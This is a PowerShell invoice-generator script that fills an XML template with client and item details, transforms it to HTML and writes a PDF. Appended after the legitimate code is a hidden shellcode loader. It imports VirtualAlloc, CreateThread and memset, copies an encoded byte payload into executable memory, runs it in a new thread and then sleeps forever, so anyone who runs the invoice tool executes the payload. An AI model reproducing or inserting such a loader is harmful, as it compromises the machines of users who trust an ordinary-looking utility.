
[CmdletBinding()]
[OutputType()]
param (
	[Parameter(Mandatory)]
	[string]$InvoiceTitle,
	[Parameter(Mandatory)]
	[string]$InvoiceNumber,
	[Parameter(Mandatory)]
	[string]$ClientCompany,
	[Parameter(Mandatory)]
	[string]$ClientName,
	[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
	[hashtable[]]$Item,
	[Parameter()]
	[string]$TopNote,
	[Parameter()]
	[string]$BottomNote,
	[Parameter()]
	[switch]$Force,
	[Parameter()]
	[ValidateScript({ Test-Path -Path $_ -PathType Leaf})]
	[string]$TemplateXmlFilePath = "$PSScriptRoot\InvoiceTemplate.xml",
	[Parameter()]
	[ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
	[string]$TemplateXslFilePath = "$PSScriptRoot\InvoiceTemplate.xsl",
	[Parameter()]
	[string]$InvoiceFilePath = "$PSScriptRoot\Invoice.pdf"
)

begin {
	$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	Set-StrictMode -Version Latest
	try {
		
		if (!$Force.IsPresent) {
			if (Test-Path -Path $InvoiceFilePath -PathType Leaf) {
				throw 'Existing invoice already exists at specified path.  To overwrite, use the -Force parameter'
			}
		}
		
		function New-InvoiceItem ($ItemDescription, $ItemPrice, $ItemQuantity) {
			
			$NewItem = $InvoiceXml.CreateElement("Item")
			[void]$NewItem.AppendChild($InvoiceXml.CreateElement("Description"))
			[void]$NewItem.AppendChild($InvoiceXml.CreateElement("Price"))
			[void]$NewItem.AppendChild($InvoiceXml.CreateElement("Quantity"))
			$NewItem.Description = $ItemDescription
			$NewItem.Price = $ItemPrice
			$NewItem.Quantity = $ItemQuantity
			[void]$InvoiceXml.Invoice.AppendChild($NewItem)
		}
		
		Function ConvertTo-PDF {
			[CmdletBinding()]
			param(
				[Parameter(ValueFromPipeline)]
				[string]$Html,
				[Parameter()]
				[string]$FileName
			)
			begin {
				$DllLoaded = $false
				$PdfGenerator = "$PsScriptRoot\NReco.PdfGenerator.dll"
				if (Test-Path $PdfGenerator) {
					try {
						$Assembly = [Reflection.Assembly]::LoadFrom($PdfGenerator)
						$PdfCreator = New-Object NReco.PdfGenerator.HtmlToPdfConverter
						$DllLoaded = $true
					} catch {
						Write-Error ('ConvertTo-PDF: Issue loading or using NReco.PdfGenerator.dll: {0}' -f $_.Exception.Message)
					}
				} else {
					Write-Error ('ConvertTo-PDF: NReco.PdfGenerator.dll was not found.')
				}
			}
			PROCESS {
				if ($DllLoaded) {
					$ReportOutput = $PdfCreator.GeneratePdf([string]$HTML)
					Add-Content -Value $ReportOutput -Encoding byte -Path $FileName
				} else {
					Throw 'Error Occurred'
				}
			}
			END { }
		}
	
	
} catch {
	Write-Error $_.Exception.Message
	break
}
}

process {
	try {
		Write-Verbose 'Building XML object'
		
		Write-Verbose "Getting template XML file $TemplateXmlFilePath"
		$script:InvoiceXml = [xml](Get-Content $TemplateXmlFilePath)
		
		
		$InvoiceXml.Invoice.InvoiceTitle = $InvoiceTitle
		$InvoiceXml.Invoice.Date = (Get-Date).ToShortDateString()
		$InvoiceXml.Invoice.ClientCompany = $ClientCompany
		$InvoiceXml.Invoice.ClientName = $ClientName
		$InvoiceXml.Invoice.InvoiceNumber = $InvoiceNumber
		$InvoiceXml.Invoice.TopNote = $TopNote
		$InvoiceXml.Invoice.BottomNote = $BottomNote
		
		
		foreach ($i in $Item) {
			if (!($i.ContainsKey('Description')) -or !($i.ContainsKey('Price')) -or !($i.ContainsKey('Quantity'))) {
				Write-Warning "Item found that does not have all necessary fields to add to invoice"
			} else {
				Write-Verbose "Adding invoice item '$($i.Description)' to invoice"
				New-InvoiceItem -ItemDescription $i.Description -ItemPrice $i.Price -ItemQuantity $i.Quantity
			}
		}
		
		
		Write-Verbose "Removing existing invoice '$InvoiceFilePath'"
		Remove-Item -Path $InvoiceFilePath -Force -ea 'SilentlyContinue'
		
		
		if (([System.IO.FileInfo]$InvoiceFilePath).Extension -eq '.xml') {
			$XmlOutput = $InvoiceFilePath
		} else {
			$XmlOutput = "$PsScriptRoot\TempXml.xml"
		}
		Write-Verbose "Saving XML file output as '$XmlOutput'"
		$InvoiceXml.Save($XmlOutput)
		
		Write-Verbose "Loading XSL file '$TemplateXslFilePath'"
		$xslt = New-Object System.Xml.Xsl.XslCompiledTransform
		$xslt.Load($TemplateXslFilePath)
		
		if (([System.IO.FileInfo]$InvoiceFilePath).Extension -eq '.html') {
			$HtmlOutput = $InvoiceFilePath
		} else {
			$HtmlOutput = "$PsScriptRoot\TempHtml.Html"
		}
		Write-Verbose "Transforming XML to HTML file '$HtmlOutput'"
		$xslt.Transform($XmlOutput, $HtmlOutput)

	} catch {
		Write-Error $_.Exception.Message
	}
}
end {
	try {
		switch (([System.IO.FileInfo]$InvoiceFilePath).Extension) {
			'.xml' {
				Write-Verbose "XML output chosen.  Removing temporary HTML file '$HtmlOutput'"
				Remove-Item -Path $HtmlOutput -Force -ea 'SilentlyContinue'
			}
			'.html' {
				Write-Verbose "HTML output chosen.  Removing temporary XML file '$XmlOutput'"
				Remove-Item -Path $XmlOutput -Force -ea 'SilentlyContinue'
			}
			'.pdf' {
				Write-Verbose "Converting '$HtmlOutput' content to PDF file '$InvoiceFilePath'"
				ConvertTo-PDF -Html (Get-Content $HtmlOutput -Raw) -FileName $InvoiceFilePath
				Write-Verbose "PDF output chosen.  Removing temporary HTML and XML files"
				Remove-Item -Path $HtmlOutput -Force -ea 'SilentlyContinue'
				Remove-Item -Path $XmlOutput -Force -ea 'SilentlyContinue'
			}
		}
	} catch {
		Write-Error $_.Exception.Message	
	}
}
$wbffEpW = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wbffEpW -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc9,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0xbf,0x3f,0xed,0xe8,0x6b,0x31,0x7e,0x18,0x83,0xee,0xfc,0x03,0x7e,0x2b,0x0f,0x1d,0x97,0xbb,0x4d,0xde,0x68,0x3b,0x32,0x56,0x8d,0x0a,0x72,0x0c,0xc5,0x3c,0x42,0x46,0x8b,0xb0,0x29,0x0a,0x38,0x43,0x5f,0x83,0x4f,0xe4,0xea,0xf5,0x7e,0xf5,0x47,0xc5,0xe1,0x75,0x9a,0x1a,0xc2,0x44,0x55,0x6f,0x03,0x81,0x88,0x82,0x51,0x5a,0xc6,0x31,0x46,0xef,0x92,0x89,0xed,0xa3,0x33,0x8a,0x12,0x73,0x35,0xbb,0x84,0x08,0x6c,0x1b,0x26,0xdd,0x04,0x12,0x30,0x02,0x20,0xec,0xcb,0xf0,0xde,0xef,0x1d,0xc9,0x1f,0x43,0x60,0xe6,0xed,0x9d,0xa4,0xc0,0x0d,0xe8,0xdc,0x33,0xb3,0xeb,0x1a,0x4e,0x6f,0x79,0xb9,0xe8,0xe4,0xd9,0x65,0x09,0x28,0xbf,0xee,0x05,0x85,0xcb,0xa9,0x09,0x18,0x1f,0xc2,0x35,0x91,0x9e,0x05,0xbc,0xe1,0x84,0x81,0xe5,0xb2,0xa5,0x90,0x43,0x14,0xd9,0xc3,0x2c,0xc9,0x7f,0x8f,0xc0,0x1e,0xf2,0xd2,0x8c,0xd3,0x3f,0xed,0x4c,0x7c,0x37,0x9e,0x7e,0x23,0xe3,0x08,0x32,0xac,0x2d,0xce,0x35,0x87,0x8a,0x40,0xc8,0x28,0xeb,0x49,0x0e,0x7c,0xbb,0xe1,0xa7,0xfd,0x50,0xf2,0x48,0x28,0xcc,0xf7,0xde,0x13,0xb9,0xf8,0x44,0xfc,0xb8,0xf8,0x69,0xa0,0x35,0x1e,0xd9,0x08,0x16,0x8f,0x99,0xf8,0xd6,0x7f,0x71,0x13,0xd9,0xa0,0x61,0x1c,0x33,0xc9,0x0b,0xf3,0xea,0xa1,0xa3,0x6a,0xb7,0x3a,0x52,0x72,0x6d,0x47,0x54,0xf8,0x82,0xb7,0x1a,0x09,0xee,0xab,0xca,0xf9,0xa5,0x96,0x5c,0x05,0x10,0xbc,0x60,0x93,0x9f,0x17,0x37,0x0b,0xa2,0x4e,0x7f,0x94,0x5d,0xa5,0xf4,0x1d,0xc8,0x06,0x62,0x62,0x1c,0x87,0x72,0x34,0x76,0x87,0x1a,0xe0,0x22,0xd4,0x3f,0xef,0xfe,0x48,0xec,0x7a,0x01,0x39,0x41,0x2c,0x69,0xc7,0xbc,0x1a,0x36,0x38,0xeb,0x9a,0x0a,0xef,0xd5,0xe8,0x62,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sVw=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sVw.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sVw,0,0,0);for (;;){Start-sleep 60};

